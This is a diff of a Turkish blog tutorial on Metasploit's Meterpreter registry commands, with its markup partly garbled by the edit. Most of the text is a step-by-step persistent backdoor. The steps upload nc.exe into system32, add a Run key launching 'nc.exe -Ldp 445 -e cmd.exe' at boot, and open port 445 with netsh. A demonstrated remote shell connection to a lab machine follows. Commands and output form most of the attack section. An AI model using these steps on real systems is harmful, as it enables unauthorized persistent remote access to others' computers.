@@ -30,7 +30,7 @@ Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok 
 Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok komut sunmaktadır. Bunlara kısaca bakalım. Bir sistemde Meterpreter shell açtığınızda reg komutunu verdiğinizde yardım bilgilerini görebilirsiniz.">
   <meta itemprop="datePublished" content="2017-06-05T13:27:00+00:00">
   <meta itemprop="dateModified" content="2017-06-05T13:27:00+00:00">
-  <meta itemprop="wordCount" content="868">
+  <meta itemprop="wordCount" content="890">
   <meta itemprop="keywords" content="Cybersecurity,Metasploit Framework">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="MSF Registry Üzerinde Çalışma">
@@ -9686,8 +9686,8 @@ Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok 
 <p>Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik, sistemde gerekli yetkiyi almanızı sağlayabilir. Bunun yanında, yapılacak hatalı bir işlem ise sistemin bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek gerekmektedir.</p>
 <p>Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok komut sunmaktadır. Bunlara kısaca bakalım. Bir sistemde Meterpreter shell açtığınızda <code>reg</code> komutunu verdiğinizde yardım bilgilerini görebilirsiniz.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reg
-Usage: reg <strong>[</strong>command<strong>]</strong> <strong>[</strong>options]
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg
+Usage: reg ***[*** command***]***  ***[*** options]
 
 Interact with the target machine's registry.
 
@@ -9712,28 +9712,26 @@ COMMANDS:
 <!-- /wp:code -->
 <p>Yardım komutunun sonucunda görebileceğiniz gibi, <code>reg</code> komutu, Registry üzerinde okuma (<code>queryval</code>), yazma (<code>setval</code>), yeni ayarlama oluşturma (<code>createkey</code>) ve silme (<code>deletekey</code>) olanağı sağlamaktadır.</p>
 <p>Bu komutlar sayesinde yeni değerler oluşturma, değerleri değiştirme yapabileceğiniz gibi doğru yerlere bakarak sistem hakkında bilgi toplama işlemleri de yapabilirsiniz. Windows Registry içerisinde hangi değerin nerede kayıt edildiği hakkında kendinizi geliştirmenizi tavsiye ediyorum. Bir fikir vermesi açısından bağlantıda bulunan PDF dosyasını inceleyebilirsiniz. <a href="https://support.accessdata.com/hc/en-us/article_attachments/201717329/Registry_Quick_Find_Chart_9-27-10.pdf">List</a></p>
-<h2 class="wp-block-heading" id="kalıcı-netcat-arka-kapısı">Kalıcı Netcat Arka Kapısı</h2>
+<h2 class="wp-block-heading" id="kalıcı-netcat-arka-kapısı">Kalıcı Netcat Arka Kapısı
 <!-- /wp:heading -->
 <p>Aşağıda adım adım gerçekleştireceğimiz örnekte, hedef sisteme <code>netcat</code> programını yerleştireceğiz. Registry ayarlarında işlemler yaparak <code>netcat</code> programının bilgisayar açıldığında otomatik başlamasını ayarlayacağız. Sistemde bulunan Firewall ayarlarının, <code>netcat</code> programına ve 445 numaralı porta müsaade etmesini sağlayacağız.</p>
-<!-- wp:heading {"level":3} -->
-<h3 class="wp-block-heading" id="ncexe-programını-yükleme">nc.exe Programını Yükleme</h3>
+<h3 class="wp-block-heading" id="ncexe-programını-yükleme">nc.exe Programını Yükleme
 <!-- /wp:heading -->
 <p>Öncelikle hedef Windows işletim sisteminin içerisine <code>nc.exe</code> olarak bilinen netcat programını yükleyelim. Bunun için önceden bir şekilde meterpreter shell açmış olmalısınız. Bununla ilgili örnekleri önceki yazılarımızda belirtmiştik. Kali işletim sistemi içerisinde <code>/usr/share/windows-binaries/</code> klasöründe faydalı bir kaç programı bulabilirsiniz.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
-<strong>[</strong><strong>*</strong><strong>]</strong> uploading  : /tmp/nc.exe -&gt; C:\windows\system32
-<strong>[</strong><strong>*</strong><strong>]</strong> uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
+***[*** ******* ***]***  uploading  : /tmp/nc.exe -&gt; C:\windows\system32
+***[*** ******* ***]***  uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe
 </code></pre>
 <!-- /wp:code -->
-<!-- wp:heading {"level":3} -->
-<h3 class="wp-block-heading" id="netcat-başlangıçta-otomatik-çalışsın">netcat Başlangıçta Otomatik Çalışsın</h3>
+<h3 class="wp-block-heading" id="netcat-başlangıçta-otomatik-çalışsın">netcat Başlangıçta Otomatik Çalışsın
 <!-- /wp:heading -->
 <p>nc.exe programının işletim sisteminin her başladığında çalışması için Registry içinde <code>HKLM\software\microsoft\windows\currentversion\run</code> anahtarına bir değer oluşturmalısınız. Öncelikle, mevcut değerleri ve ayarları görelim. Ters \ işaretlerinin iki defa yazıldığına dikkat edin.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 Enumerating: HKLM\software\microsoft\windows\currentversion\run
 
-  Values <strong>(</strong>3<strong>)</strong>:
+  Values ***(*** 3***)*** :
 
     VMware Tools
     VMware User Process
@@ -9742,61 +9740,60 @@ Enumerating: HKLM\software\microsoft\windows\currentversion\run
 <!-- /wp:code -->
 <p>Komut çıktısında görüldüğü gibi şu an için <code>VMware Tools, VMware User Process, quicktftpserver</code> yazılımları otomatik başlamaya ayarlanmış durumda. Biz yeni ayarımızı <code>reg setval</code> komutu ile ilave edelim ve <code>reg queryval</code> komutu ile tekrar kontrol edelim.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
 Successful set nc.
-meterpreter <strong>&gt;</strong> reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+meterpreter ***&gt;***  reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
 Key: HKLM\software\microsoft\windows\currentversion\Run
 Name: nc
 Type: REG_SZ
 Data: C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe
 </code></pre>
 <!-- /wp:code -->
-<!-- wp:heading {"level":3} -->
-<h3 class="wp-block-heading" id="firewall-ayarları">Firewall Ayarları</h3>
+<h3 class="wp-block-heading" id="firewall-ayarları">Firewall Ayarları
 <!-- /wp:heading -->
 <p>Doğrudan Registry ayarlarından yapabileceğinizi gibi <code>netsh</code> komutu ile de firewall ayarlarını yapabilirsiniz. Kullanımı göstermek açısından, firewall ayarlarını komut satırından ayarlayalım. Bunun için Meterpreter komut satırından Windows komut satırına girelim.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> execute -f cmd -i
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  execute -f cmd -i
 Process 1604 created.
 Channel 1 created.
-Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
-<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.
-C:\ <strong>&gt;</strong>
+Microsoft Windows XP ***[*** Version 5.1.2600]
+***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
+C:\ ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 <p>Firewall ayarlarının mevcut halini görelim.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ <strong>&gt;</strong> netsh firewall show opmode
+<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall show opmode
 Netsh firewall show opmode
 
 Domain profile configuration:
 -------------------------------------------------------------------
-Operational mode                  <strong>=</strong> Enable
-Exception mode                    <strong>=</strong> Enable
+Operational mode                  ***=***  Enable
+Exception mode                    ***=***  Enable
 
-Standard profile configuration <strong>(</strong>current<strong>)</strong>:
+Standard profile configuration ***(*** current***)*** :
 -------------------------------------------------------------------
-Operational mode                  <strong>=</strong> Enable
-Exception mode                    <strong>=</strong> Enable
+Operational mode                  ***=***  Enable
+Exception mode                    ***=***  Enable
 
 Local Area Connection firewall configuration:
 -------------------------------------------------------------------
-Operational mode                  <strong>=</strong> Enable
+Operational mode                  ***=***  Enable
 </code></pre>
 <!-- /wp:code -->
 <p>Şimdi 445 numaralı Portu izin verilen Portlar arasına ekleyelim.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ <strong>&gt;</strong> netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 Ok.
 </code></pre>
 <!-- /wp:code -->
 <p>Yaptığımız işlemin hayata geçip geçmediğini kontrol edelim.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ <strong>&gt;</strong> netsh firewall show portopening
+<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall show portopening
 netsh firewall show portopening
 
-Port configuration <strong>for </strong>Domain profile:
+Port configuration ***for *** Domain profile:
 Port   Protocol  Mode     Name
 -------------------------------------------------------------------
 139    TCP       Enable   NetBIOS Session Service
@@ -9804,7 +9801,7 @@ Port   Protocol  Mode     Name
 137    UDP       Enable   NetBIOS Name Service
 138    UDP       Enable   NetBIOS Datagram Service
 
-Port configuration <strong>for </strong>Standard profile:
+Port configuration ***for *** Standard profile:
 Port   Protocol  Mode     Name
 -------------------------------------------------------------------
 445    TCP       Enable   Service Firewall
@@ -9814,20 +9811,20 @@ Port   Protocol  Mode     Name
 138    UDP       Enable   NetBIOS Datagram Service
 
 
-C:\ <strong>&gt;</strong>
+C:\ ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 <p>Hedef sistem tekrar başladığında <code>nc.exe</code> otomatik olarak çalışacak ve dışarıdan bağlantılara imkan sağlayacaktır. Aşağıdaki örnekte <code>nc</code> komutuyla hedef sisteme bağlanılabildiği görülmektedir.</p>
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# nc -v 172.16.104.128 445
 172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
-<strong>(</strong>UNKNOWN<strong>)</strong> <strong>[</strong>172.16.104.128] 445 <strong>(</strong>?<strong>)</strong> open
-Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
-<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.
+***(*** UNKNOWN***)***  ***[*** 172.16.104.128] 445 ***(*** ?***)***  open
+Microsoft Windows XP ***[*** Version 5.1.2600]
+***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
 
-C:\ <strong>&gt;</strong> dir
+C:\ ***&gt;***  dir
 dir
-Volume <strong>in </strong>drive C has no label.
+Volume ***in *** drive C has no label.
 Volume Serial Number is E423-E726
 
 Directory of C:\
@@ -9848,10 +9845,10 @@ My Documents
 Start Menu
 05/03/2009 01:25 AM 0 talltelnet.log
 05/03/2009 01:25 AM 0 talltftp.log
-4 File<strong>(</strong>s<strong>)</strong> 0 bytes
-6 Dir<strong>(</strong>s<strong>)</strong> 35,540,791,296 bytes free
+4 File***(*** s***)***  0 bytes
+6 Dir***(*** s***)***  35,540,791,296 bytes free
 
-C:\ <strong>&gt;</strong>
+C:\ ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 <p>Gerçek durumlarda, böyle bir arka kapı açmak bu kadar kolay olmasa da uygulanacak işlemlerin mantığı yukarıda anlatıldığı gibidir. Bu yazıda, Registry kayıtları kullanarak bir arka kapı açmanın mantığını açıklamaya çalıştık. Yukarıdaki örneği birebir uygulayıp başarısız olursanız umutsuzluğa kapılmayın. Daha sıkı çalışın.</p>
